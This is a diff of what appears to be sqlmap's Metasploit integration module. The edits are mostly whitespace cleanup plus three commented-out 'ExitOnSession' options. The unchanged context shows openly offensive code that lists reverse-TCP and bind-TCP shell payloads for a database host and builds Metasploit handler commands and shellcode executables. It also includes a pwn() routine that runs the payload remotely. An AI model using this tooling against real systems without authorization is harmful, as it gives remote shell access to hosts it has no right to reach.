@@ -53,12 +53,9 @@ class Metasploit:
         self.payloadStr     = None
         self.encoderStr     = None
         self.payloadConnStr = None
-
         self.resourceFile   = None
-
         self.localIP        = getLocalIP()
         self.remoteIP       = getRemoteIP()
-
         self.__msfCli       = normalizePath(os.path.join(conf.msfPath, "msfcli"))
         self.__msfConsole   = normalizePath(os.path.join(conf.msfPath, "msfconsole"))
         self.__msfEncode    = normalizePath(os.path.join(conf.msfPath, "msfencode"))
@@ -79,7 +76,7 @@ class Metasploit:
                                       "windows": {
                                                    1: ( "Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp" ),
                                                    2: ( "Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535", "reverse_tcp_allports" ),
-                                                   3: ( "Bind TCP: Listen on the database host for a connection", "bind_tcp" ),
+                                                   3: ( "Bind TCP: Listen on the database host for a connection", "bind_tcp" )
                                                  },
                                       "linux":   {
                                                    1: ( "Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp" ),
@@ -304,16 +301,15 @@ class Metasploit:
         self.__cliCmd  = "%s multi/handler PAYLOAD=%s" % (self.__msfCli, self.payloadConnStr)
         self.__cliCmd += " EXITFUNC=%s" % exitfunc
         self.__cliCmd += " LPORT=%s" % self.portStr
+        #self.__cliCmd += " ExitOnSession=true"
 
         if self.payloadStr == "windows/vncinject":
             self.__cliCmd += " DisableCourtesyShell=1"
 
         if self.connectionStr.startswith("bind"):
             self.__cliCmd += " RHOST=%s" % self.rhostStr
-
         elif self.connectionStr.startswith("reverse"):
             self.__cliCmd += " LHOST=%s" % self.lhostStr
-
         else:
             raise sqlmapDataException, "unexpected connection type"
 
@@ -332,13 +328,12 @@ class Metasploit:
         self.__resource += "set SRVPORT %s\n" % self.__selectSMBPort()
         self.__resource += "set PAYLOAD %s\n" % self.payloadConnStr
         self.__resource += "set LPORT %s\n" % self.portStr
+        #self.__resource += "set ExitOnSession true\n"
 
         if self.connectionStr.startswith("bind"):
             self.__resource += "set RHOST %s\n" % self.rhostStr
-
         elif self.connectionStr.startswith("reverse"):
             self.__resource += "set LHOST %s\n" % self.lhostStr
-
         else:
             raise sqlmapDataException, "unexpected connection type"
 
@@ -352,6 +347,7 @@ class Metasploit:
         self.__payloadCmd  = "%s %s" % (self.__msfPayload, self.payloadConnStr)
         self.__payloadCmd += " EXITFUNC=%s" % exitfunc
         self.__payloadCmd += " LPORT=%s" % self.portStr
+        #self.__payloadCmd += " ExitOnSession=true"
 
         if self.connectionStr.startswith("reverse"):
             self.__payloadCmd += " LHOST=%s" % self.lhostStr
@@ -502,7 +498,7 @@ class Metasploit:
         infoMsg = "creating Metasploit Framework 3 multi-stage shellcode "
         logger.info(infoMsg)
 
-        self.__randStr           = randomStr(lowercase=True)
+        self.__randStr = randomStr(lowercase=True)
         self.__shellcodeFilePath = os.path.join(conf.outputPath, "tmpm%s" % self.__randStr)
 
         self.__initVars()
@@ -566,7 +562,7 @@ class Metasploit:
                 self.__fileFormat = "exe"
         else:
             self.exeFilePathLocal = os.path.join(conf.outputPath, "tmpm%s" % self.__randStr)
-            self.__fileFormat     = "elf"
+            self.__fileFormat = "elf"
 
         if initialize:
             self.__initVars()
@@ -592,7 +588,7 @@ class Metasploit:
 
         if payloadSize:
             payloadSize = payloadSize.group(1)
-            exeSize     = os.path.getsize(self.exeFilePathLocal)
+            exeSize = os.path.getsize(self.exeFilePathLocal)
 
             # Only pack the payload stager if the back-end DBMS operating
             # system is Windows and new portable executable template is
@@ -602,7 +598,7 @@ class Metasploit:
             else:
                 packedSize = None
 
-            debugMsg    = "the encoded payload size is %s bytes, " % payloadSize
+            debugMsg = "the encoded payload size is %s bytes, " % payloadSize
 
             if packedSize and packedSize < exeSize:
                 debugMsg += "as a compressed portable executable its size "
@@ -637,10 +633,10 @@ class Metasploit:
     def pwn(self, goUdf=False):
         if goUdf:
             exitfunc = "thread"
-            func     = self.__runMsfShellcodeRemote
+            func = self.__runMsfShellcodeRemote
         else:
             exitfunc = "process"
-            func     = self.__runMsfPayloadRemote
+            func = self.__runMsfPayloadRemote
 
         self.__runMsfCli(exitfunc=exitfunc)
 
